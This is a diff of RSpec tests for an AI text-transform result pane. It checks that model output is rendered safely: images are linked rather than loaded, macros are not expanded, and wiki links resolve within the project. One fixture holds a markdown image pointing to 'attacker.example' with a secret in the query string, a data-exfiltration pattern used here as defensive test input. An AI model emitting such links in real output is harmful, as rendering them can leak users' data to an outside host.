@@ -75,6 +75,40 @@ RSpec.describe AI::TextTransforms::ResultPaneComponent::Body, type: :component d
     end
   end
 
+  context "with an image in the output" do
+    before do
+      run.events.build(kind: "text_delta", payload: { "delta" => " ![chart](https://attacker.example/?d=secret)" }, seq: 2)
+    end
+
+    it "links the image instead of loading it" do
+      expect(subject).to have_no_css("img", visible: :all)
+      expect(subject).to have_link("Image: chart", href: "https://attacker.example/?d=secret")
+    end
+  end
+
+  context "with a macro in the output" do
+    before do
+      run.events.build(kind: "text_delta", payload: { "delta" => "\n\n# Heading\n\n<macro class=\"toc\"></macro>" }, seq: 2)
+    end
+
+    it "does not expand it" do
+      expect(subject).to have_no_css("macro, .op-uc-toc", visible: :all)
+    end
+  end
+
+  context "for a new work package of a project" do
+    let(:type) { create(:type) }
+    let(:project) { create(:project, :with_internal_wiki, types: [type]).reload }
+    let(:context) { AI::TextTransforms::Context.for_new_work_package(project:, type:) }
+    let(:pane) { AI::TextTransforms::ResultPaneState.new(run:, scope:, request_id: SecureRandom.uuid, context:) }
+
+    before { run.events.build(kind: "text_delta", payload: { "delta" => " [[Release notes]]" }, seq: 2) }
+
+    it "resolves wiki links within the project" do
+      expect(subject).to have_link("Release notes", href: %r{\A/projects/#{project.identifier}/wiki/release-notes})
+    end
+  end
+
   context "when stopped" do
     let(:status) { "failed" }
 
